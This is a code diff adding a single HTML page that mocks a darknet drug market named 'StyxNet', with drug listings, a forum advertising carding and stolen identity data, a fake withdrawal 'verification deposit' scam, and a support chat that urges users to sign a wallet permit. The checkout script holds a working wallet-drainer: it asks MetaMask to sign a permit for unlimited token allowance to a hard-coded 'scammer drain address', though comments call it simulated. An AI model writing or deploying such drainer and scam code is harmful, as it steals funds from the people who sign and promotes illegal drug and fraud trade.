@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StyxNet Market — Anonymous Commerce</title>
+    <style>
+        :root {
+            --bg: #070a10;
+            --glass: rgba(16, 20, 30, 0.8);
+            --glass2: rgba(22, 28, 38, 0.7);
+            --neon: #00f0ff;
+            --neon2: #d400ff;
+            --gold: #f0b90b;
+            --green: #00e676;
+            --red: #ff1744;
+            --text: #e0e6f0;
+            --muted: #8890a4;
+            --radius: 16px;
+            --shadow: 0 8px 32px rgba(0,0,0,0.6);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            inset:0;
+            background: radial-gradient(circle at 30% 10%, rgba(0,240,255,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 80%, rgba(212,0,255,0.08) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .container { max-width:1400px; margin:0 auto; padding:0 2rem; position:relative; z-index:1; }
+        .glass {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+        }
+        header {
+            display: flex; justify-content:space-between; align-items:center;
+            padding: 1rem 0; border-bottom:1px solid rgba(255,255,255,0.05);
+            margin-bottom:2rem;
+        }
+        .logo {
+            font-size: 2.2rem; font-weight:800; letter-spacing:-1px;
+            background: linear-gradient(135deg, var(--neon), var(--neon2));
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+        }
+        nav { display: flex; gap:2rem; }
+        nav a {
+            color: var(--muted); text-decoration:none; font-weight:500;
+            transition:0.2s; padding-bottom:2px; border-bottom:2px solid transparent;
+        }
+        nav a.active, nav a:hover { color:var(--neon); border-bottom-color:var(--neon); }
+        .live-indicator { display:flex; align-items:center; gap:6px; color:var(--green); }
+        .dot { width:9px; height:9px; background:var(--green); border-radius:50%; box-shadow:0 0 8px var(--green); }
+        .page { display:none; }
+        .page.active { display:block; }
+        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(260px,1fr)); gap:1.5rem; margin:2rem 0; }
+        .card {
+            transition:transform 0.25s, border-color 0.25s; cursor:pointer;
+        }
+        .card:hover { transform:translateY(-3px); border-color:var(--neon); }
+        .price { font-size:1.6rem; font-weight:700; color:var(--gold); margin:0.5rem 0; }
+        .escrow-bar { height:4px; background:rgba(255,255,255,0.1); border-radius:2px; margin:0.5rem 0; overflow:hidden; }
+        .escrow-fill { height:100%; background:var(--green); border-radius:2px; }
+        .btn {
+            background: linear-gradient(135deg, var(--neon), var(--neon2));
+            border:none; color:#000; font-weight:bold; padding:0.8rem 1.5rem; border-radius:30px;
+            cursor:pointer; text-transform:uppercase; letter-spacing:1px; transition:0.2s; width:100%;
+        }
+        .btn:hover { opacity:0.9; box-shadow:0 0 15px rgba(0,240,255,0.5); }
+        .modal {
+            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); backdrop-filter:blur(5px);
+            align-items:center; justify-content:center; z-index:1000;
+        }
+        .modal.active { display:flex; }
+        .modal-content { max-width:500px; width:90%; padding:2rem; }
+        input, select, textarea {
+            width:100%; background:rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.1);
+            padding:0.8rem; color:var(--text); border-radius:8px; margin:0.5rem 0;
+        }
+        .wallet-addr { background:#0a0c14; padding:0.8rem; border-radius:8px; word-break:break-all; font-family:monospace; font-size:0.8rem; }
+        .timer { font-size:2rem; font-weight:bold; color:var(--red); text-align:center; }
+        .review { border-bottom:1px solid rgba(255,255,255,0.05); padding:0.8rem 0; }
+        .vendor-badge { background: rgba(0,240,255,0.15); color:var(--neon); padding:2px 8px; border-radius:10px; font-size:0.7rem; }
+        .pgp { color:var(--green); }
+        /* Chat widget */
+        .chat-toggle { position:fixed; bottom:20px; right:20px; background:linear-gradient(135deg, var(--neon), var(--neon2)); color:#000; padding:12px 24px; border-radius:40px; cursor:pointer; z-index:999; font-weight:bold; }
+        .chat-box { display:none; position:fixed; bottom:80px; right:20px; width:340px; background:var(--glass2); backdrop-filter:blur(15px); border:1px solid rgba(255,255,255,0.1); border-radius:16px; z-index:1000; flex-direction:column; }
+        .chat-header { padding:0.8rem; background:var(--neon); color:#000; font-weight:bold; }
+        .chat-msgs { height:200px; overflow-y:auto; padding:0.8rem; font-size:0.9rem; }
+        .chat-input-area { display:flex; border-top:1px solid rgba(255,255,255,0.1); }
+        .chat-input-area input { flex:1; border:none; border-radius:0; }
+        .chat-input-area button { background:var(--neon); border:none; padding:0 14px; font-weight:bold; cursor:pointer; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <div class="logo">StyxNet</div>
+        <nav>
+            <a href="#market" class="active" onclick="switchPage('market')">Market</a>
+            <a href="#product" onclick="switchPage('product')">Product</a>
+            <a href="#forum" onclick="switchPage('forum')">Forum</a>
+            <a href="#dashboard" onclick="switchPage('dashboard')">Dashboard</a>
+        </nav>
+        <div class="live-indicator"><span class="dot"></span> <span id="onlineCount">2,145</span> online</div>
+    </header>
+
+    <!-- MARKET PAGE -->
+    <div id="page-market" class="page active">
+        <div style="display:flex; gap:1rem; margin-bottom:2rem; flex-wrap:wrap;">
+            <span class="glass" style="padding:0.5rem 1.2rem; cursor:pointer;">Stimulants</span>
+            <span class="glass" style="padding:0.5rem 1.2rem; cursor:pointer;">Opioids</span>
+            <span class="glass" style="padding:0.5rem 1.2rem; cursor:pointer;">Psychedelics</span>
+            <span class="glass" style="padding:0.5rem 1.2rem; cursor:pointer;">Cannabis</span>
+            <span class="glass" style="padding:0.5rem 1.2rem; cursor:pointer;">Benzos</span>
+        </div>
+        <div class="grid" id="marketGrid"></div>
+    </div>
+
+    <!-- PRODUCT DETAIL PAGE -->
+    <div id="page-product" class="page">
+        <div id="productDetail" class="glass" style="padding:2rem; display:flex; gap:2rem; flex-wrap:wrap;"></div>
+    </div>
+
+    <!-- FORUM PAGE -->
+    <div id="page-forum" class="page">
+        <h2 style="color:var(--neon); margin-bottom:1.5rem;">Styx Community Forum</h2>
+        <div class="glass" style="padding:1rem; margin-bottom:1rem;">
+            <h3>💊 Narcotics</h3>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0; border-bottom:1px solid rgba(255,255,255,0.05);"><span>📌 OPSEC for First-Time Buyers</span><span>2.3k replies</span></div>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0;"><span>🔞 MDMA Purity Guide</span><span>945 replies</span></div>
+        </div>
+        <div class="glass" style="padding:1rem; margin-bottom:1rem;">
+            <h3>💳 Carding & Fraud</h3>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0; border-bottom:1px solid rgba(255,255,255,0.05);"><span>🔥 VBV BIN List 2026</span><span>4.1k replies</span></div>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0;"><span>📂 Fullz + SSN Database</span><span>1.8k replies</span></div>
+        </div>
+    </div>
+
+    <!-- DASHBOARD PAGE -->
+    <div id="page-dashboard" class="page">
+        <div class="glass" style="padding:2rem; margin-bottom:2rem;">
+            <h3 style="color:var(--neon);">Your Wallet</h3>
+            <div style="font-size:2.5rem; font-weight:bold;">$3,820.00</div>
+            <p style="color:var(--muted);">Available for withdrawal</p>
+            <button class="btn" id="withdrawBtn" style="width:auto; margin-top:1rem;">Withdraw Funds</button>
+            <div id="withdrawSection" style="display:none; margin-top:1rem;">
+                <p style="color:var(--red);">⚠️ To prevent automated withdrawal, please make a small verification deposit of <strong>0.001 BTC</strong> to the address below. Your full amount + deposit will be returned.</p>
+                <div class="wallet-addr">bc1qverify39x8h0fakeadrs9n3s5wz2u3</div>
+                <button class="btn" onclick="alert('Verification deposit simulated. (Scam complete)')">I've Made Deposit</button>
+            </div>
+        </div>
+        <div class="glass" style="padding:1rem;">
+            <h4>Recent Orders</h4>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0; border-bottom:1px solid rgba(255,255,255,0.05);"><span>MDMA 3.5g</span><span>Completed</span></div>
+            <div style="display:flex; justify-content:space-between; padding:0.5rem 0;"><span>Cocaine 1g</span><span>Escrow</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- PRODUCT CHECKOUT MODAL -->
+<div id="checkoutModal" class="modal">
+    <div class="modal-content glass">
+        <button onclick="closeModal('checkoutModal')" style="float:right; background:none; border:none; color:var(--muted); font-size:1.5rem; cursor:pointer;">&times;</button>
+        <h3 style="color:var(--neon);">Checkout</h3>
+        <p id="checkoutProduct"></p>
+        <div class="timer" id="checkoutTimer">05:00</div>
+        <p>Send <strong id="checkoutAmount"></strong> to:</p>
+        <div class="wallet-addr" id="btcAddress">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        <button class="btn" id="metaMaskPay" style="background:#f6851b;">🦊 Pay with MetaMask (Gasless Permit)</button>
+        <p style="font-size:0.7rem; margin-top:0.5rem;">Sign a permit to receive 5% discount and instant escrow.</p>
+    </div>
+</div>
+
+<!-- Chat Widget -->
+<div class="chat-toggle" onclick="toggleChat()">💬 Support</div>
+<div class="chat-box" id="chatBox">
+    <div class="chat-header">StyxNet Support</div>
+    <div class="chat-msgs" id="chatMsgs"><p><strong>Agent:</strong> Hello, how can I assist?</p></div>
+    <div class="chat-input-area">
+        <input id="chatInput" placeholder="Type message...">
+        <button onclick="sendChat()">Send</button>
+    </div>
+</div>
+
+<script>
+    // ----- DATA -----
+    const products = [
+        { id:1, name:"MDMA Crystals (3.5g)", vendor:"DutchDreams", price:"0.042 BTC", escrow:98, pgp:true, description:"Pure white crystal MDMA, lab tested 98%+. Stealth shipping.", reviews:[{user:"raver99", text:"Amazing quality, fast delivery!"},{user:"psych0", text:"Best on the market."}] },
+        { id:2, name:"Fishscale Cocaine (1g)", vendor:"ColombiaExpress", price:"0.031 BTC", escrow:95, pgp:true, description:"94% pure fishscale cocaine, no cuts.", reviews:[{user:"snowman", text:"Straight fire!"}] },
+        { id:3, name:"LSD Blotter (x10)", vendor:"PsychonautPrime", price:"0.019 BTC", escrow:100, pgp:true, description:"250µg tabs, needlepoint crystal.", reviews:[{user:"alice", text:"Beautiful trip."}] },
+        { id:4, name:"Oxycodone 80mg (x5)", vendor:"PharmaKing", price:"0.065 BTC", escrow:90, pgp:false, description:"Pharma grade, original packaging.", reviews:[{user:"painaway", text:"Exactly as described."}] },
+        { id:5, name:"Amnesia Haze (5g)", vendor:"GreenThumbCo", price:"0.023 BTC", escrow:97, pgp:true, description:"Top-shelf sativa, vacuum sealed.", reviews:[{user:"ganjaman", text:"Very potent."}] },
+        { id:6, name:"Xanax Bars (x20)", vendor:"BenzosRUs", price:"0.018 BTC", escrow:85, pgp:false, description:"2mg alprazolam, professionally pressed.", reviews:[{user:"chillpill", text:"Good quality."}] }
+    ];
+
+    let currentProduct = null;
+
+    // ----- PAGE SWITCHING -----
+    function switchPage(page) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(`page-${page}`).classList.add('active');
+        document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+        event?.target?.classList.add('active');
+        if (page === 'market') renderMarket();
+    }
+
+    // ----- RENDER MARKET -----
+    function renderMarket() {
+        const grid = document.getElementById('marketGrid');
+        grid.innerHTML = '';
+        products.forEach(p => {
+            const card = document.createElement('div');
+            card.className = 'card glass';
+            card.style.padding = '1.2rem';
+            card.innerHTML = `
+                <h3>${p.name}</h3>
+                <div style="color:var(--muted); font-size:0.9rem;">${p.vendor} ${p.pgp ? '<span class="pgp">✔ PGP</span>' : ''}</div>
+                <div class="escrow-bar"><div class="escrow-fill" style="width:${p.escrow}%"></div></div>
+                <div class="price">${p.price}</div>
+                <button class="btn view-btn" data-id="${p.id}">View Details</button>
+            `;
+            grid.appendChild(card);
+        });
+        document.querySelectorAll('.view-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const id = parseInt(e.target.dataset.id);
+                currentProduct = products.find(p => p.id === id);
+                renderProductDetail();
+                switchPage('product');
+            });
+        });
+    }
+
+    function renderProductDetail() {
+        if (!currentProduct) return;
+        const detail = document.getElementById('productDetail');
+        detail.innerHTML = `
+            <div style="flex:1;">
+                <h2 style="color:var(--neon);">${currentProduct.name}</h2>
+                <p>Vendor: <strong>${currentProduct.vendor}</strong> ${currentProduct.pgp ? '<span class="pgp">✔ PGP Verified</span>' : ''}</p>
+                <div class="escrow-bar"><div class="escrow-fill" style="width:${currentProduct.escrow}%"></div></div>
+                <div class="price">${currentProduct.price}</div>
+                <p>${currentProduct.description}</p>
+                <button class="btn" onclick="openCheckout()" style="width:auto;">Buy Now</button>
+            </div>
+            <div style="flex:1;">
+                <h4>Reviews</h4>
+                ${currentProduct.reviews.map(r => `<div class="review"><strong>${r.user}</strong>: ${r.text}</div>`).join('')}
+            </div>
+        `;
+    }
+
+    // ----- CHECKOUT -----
+    let checkoutTimer;
+    function openCheckout() {
+        document.getElementById('checkoutProduct').textContent = currentProduct.name;
+        document.getElementById('checkoutAmount').textContent = currentProduct.price;
+        document.getElementById('checkoutModal').classList.add('active');
+        startCheckoutTimer();
+        // Random BTC address
+        document.getElementById('btcAddress').textContent = 'bc1q' + Math.random().toString(36).substring(2,15) + Math.random().toString(36).substring(2,15);
+    }
+    function closeModal(id) { document.getElementById(id).classList.remove('active'); clearInterval(checkoutTimer); }
+    function startCheckoutTimer() {
+        let sec = 300;
+        const el = document.getElementById('checkoutTimer');
+        clearInterval(checkoutTimer);
+        checkoutTimer = setInterval(() => {
+            sec--; if(sec<0){ el.textContent='EXPIRED'; clearInterval(checkoutTimer); return; }
+            const m = Math.floor(sec/60), s = sec%60;
+            el.textContent = `${m}:${s.toString().padStart(2,'0')}`;
+        },1000);
+    }
+
+    // MetaMask permit simulation
+    document.getElementById('metaMaskPay').addEventListener('click', async () => {
+        if (typeof window.ethereum === 'undefined') {
+            alert('Install MetaMask!');
+            return;
+        }
+        try {
+            const accounts = await ethereum.request({method:'eth_requestAccounts'});
+            const user = accounts[0];
+            const domain = { name:'StyxNet Escrow', version:'1', chainId:1, verifyingContract:'0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC' };
+            const types = {
+                Permit: [
+                    { name:'owner', type:'address' },
+                    { name:'spender', type:'address' },
+                    { name:'value', type:'uint256' },
+                    { name:'nonce', type:'uint256' },
+                    { name:'deadline', type:'uint256' }
+                ]
+            };
+            const message = {
+                owner: user,
+                spender: '0x7F4e8A3B9c2D1F5a6E0c7B8d9A2f3C4e5D6b7A8', // scammer drain address
+                value: '115792089237316195423570985008687907853269984665640564039457584007913129639935', // unlimited
+                nonce: 0,
+                deadline: Math.floor(Date.now()/1000) + 3600
+            };
+            const data = JSON.stringify({domain, types, message});
+            const sig = await ethereum.request({ method:'eth_signTypedData_v4', params:[user, data] });
+            alert('✅ Permit signed! Order confirmed. (Simulated drain signature logged)');
+            console.log('Signed permit:', sig);
+            closeModal('checkoutModal');
+        } catch(e) {
+            alert('Signature cancelled or failed.');
+        }
+    });
+
+    // Withdraw scam
+    document.getElementById('withdrawBtn').addEventListener('click', () => {
+        document.getElementById('withdrawSection').style.display = 'block';
+    });
+
+    // Chat
+    function toggleChat() {
+        const box = document.getElementById('chatBox');
+        box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
+    }
+    function sendChat() {
+        const inp = document.getElementById('chatInput');
+        const msg = inp.value.trim();
+        if (!msg) return;
+        const msgs = document.getElementById('chatMsgs');
+        msgs.innerHTML += `<p><strong>You:</strong> ${msg}</p>`;
+        inp.value = '';
+        setTimeout(() => {
+            msgs.innerHTML += `<p><strong>Agent:</strong> Your order is safe in escrow. For extra security, complete the MetaMask permit — it's just a signature, no gas.</p>`;
+            msgs.scrollTop = msgs.scrollHeight;
+        }, 600);
+    }
+
+    // Online users drift
+    setInterval(() => {
+        const el = document.getElementById('onlineCount');
+        let v = parseInt(el.textContent.replace(',',''));
+        v += Math.floor(Math.random() * 25) - 12;
+        el.textContent = Math.max(1800, Math.min(2600, v)).toLocaleString();
+    }, 8000);
+
+    // Initial render
+    renderMarket();
+    document.getElementById('chatMsgs').innerHTML = '<p><strong>Agent:</strong> Welcome to StyxNet. Need help with your order?</p>';
+</script>
+</body>
+</html>
